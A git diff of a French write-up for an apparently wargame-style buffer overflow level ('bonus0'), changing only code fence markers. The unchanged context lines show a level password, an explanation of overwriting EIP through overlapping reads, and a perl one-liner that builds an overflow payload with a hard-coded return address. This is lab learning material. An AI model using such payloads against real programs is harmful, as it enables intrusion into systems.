@@ -4,7 +4,7 @@ pass : `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`
 
 ## Sources :
 
-```c=
+```c
 #include <stdio.h>
 #include <unistd.h>
 #include <string.h>
@@ -60,7 +60,7 @@ Donc si le premier `read` fait exactement plus de 20 caractères, les 20 premier
 On écrit donc `20 + 20 + 1 + 20` caractères dans `buf` qui dépasse les `42` aloués, et on écrit donc dans la stack.
 Et quand on quitte le main, et qu'on déstack, on se retrouve à écrire dans `EIP` et le programme segfault.
 
-```shell=
+```shell
 ./bonus0
  -
 abcdefghijabcdefghij
@@ -88,7 +88,7 @@ l'adresse de buf: `0xbffff236`
 On va se créer un programme pour retrouver l'adresse de l'env.
 
 getenv.c:
-```c=
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -127,6 +127,6 @@ perl -e 'print "A"x4095 . "\n" . "B"x9 . "\x11\xf9\xff\xbf" . "B"x7 . "\n"' > /t
 
 ## Exploit :
 
-```sh=
+```sh
 
 ```
